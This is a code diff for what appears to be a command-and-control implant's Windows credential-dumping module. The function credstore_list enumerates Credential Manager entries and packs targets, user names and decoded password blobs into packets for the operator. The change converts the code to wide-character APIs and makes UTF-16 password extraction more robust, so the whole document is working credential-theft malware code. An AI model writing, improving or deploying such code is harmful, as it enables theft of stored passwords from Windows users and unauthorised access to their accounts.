@@ -66,12 +66,12 @@ static const char *cred_type_name(DWORD type)
 
 static tlv_pkt_t *credstore_list(c2_t *c2)
 {
-    PCREDENTIALA *creds;
+    PCREDENTIALW *creds;
     DWORD count;
     DWORD i;
     tlv_pkt_t *result;
 
-    if (!CredEnumerateA(NULL, 0, &count, &creds))
+    if (!CredEnumerateW(NULL, 0, &count, &creds))
     {
         log_debug("* CredEnumerate failed (%lu)\n", GetLastError());
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
@@ -81,39 +81,78 @@ static tlv_pkt_t *credstore_list(c2_t *c2)
 
     for (i = 0; i < count; i++)
     {
-        PCREDENTIALA cred = creds[i];
+        PCREDENTIALW cred = creds[i];
         tlv_pkt_t *entry;
-        char pass_buf[512];
+        char *utf8;
 
         entry = tlv_pkt_create();
 
         if (cred->TargetName)
         {
-            tlv_pkt_add_string(entry, TLV_TYPE_CRED_TARGET, cred->TargetName);
+            utf8 = wchar_to_utf8(cred->TargetName);
+            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_TARGET, utf8); free(utf8); }
         }
 
         if (cred->UserName)
         {
-            tlv_pkt_add_string(entry, TLV_TYPE_CRED_USER, cred->UserName);
+            utf8 = wchar_to_utf8(cred->UserName);
+            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_USER, utf8); free(utf8); }
         }
 
         if (cred->Comment)
         {
-            tlv_pkt_add_string(entry, TLV_TYPE_CRED_COMMENT, cred->Comment);
+            utf8 = wchar_to_utf8(cred->Comment);
+            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_COMMENT, utf8); free(utf8); }
         }
 
         tlv_pkt_add_u32(entry, TLV_TYPE_CRED_TYPE, (int32_t)cred->Type);
 
         if (cred->CredentialBlobSize > 0 && cred->CredentialBlob != NULL)
         {
-            DWORD blob_len = cred->CredentialBlobSize;
-            if (blob_len >= sizeof(pass_buf))
+            /* CredentialBlob is binary data - try to interpret as
+             * wide string first (most Windows credentials are
+             * stored as UTF-16), otherwise send raw bytes.
+             * Must null-terminate since CredentialBlob has no
+             * guaranteed null terminator. */
+            if (cred->CredentialBlobSize >= 2 &&
+                cred->CredentialBlobSize % 2 == 0)
             {
-                blob_len = sizeof(pass_buf) - 1;
+                DWORD wchars = cred->CredentialBlobSize / sizeof(WCHAR);
+                WCHAR *blob_copy = (WCHAR *)calloc(wchars + 1, sizeof(WCHAR));
+
+                if (blob_copy != NULL)
+                {
+                    memcpy(blob_copy, cred->CredentialBlob, cred->CredentialBlobSize);
+                    blob_copy[wchars] = L'\0';
+
+                    utf8 = wchar_to_utf8(blob_copy);
+                    free(blob_copy);
+
+                    if (utf8)
+                    {
+                        tlv_pkt_add_string(entry, TLV_TYPE_CRED_PASS, utf8);
+                        free(utf8);
+                    }
+                    else
+                    {
+                        tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
+                                          cred->CredentialBlob,
+                                          cred->CredentialBlobSize);
+                    }
+                }
+                else
+                {
+                    tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
+                                      cred->CredentialBlob,
+                                      cred->CredentialBlobSize);
+                }
             }
-            memcpy(pass_buf, cred->CredentialBlob, blob_len);
-            pass_buf[blob_len] = '\0';
-            tlv_pkt_add_string(entry, TLV_TYPE_CRED_PASS, pass_buf);
+            else
+            {
+                tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
+                                  cred->CredentialBlob,
+                                  cred->CredentialBlobSize);
+            }
         }
 
         tlv_pkt_add_tlv(result, TLV_TYPE_CRED_GROUP, entry);
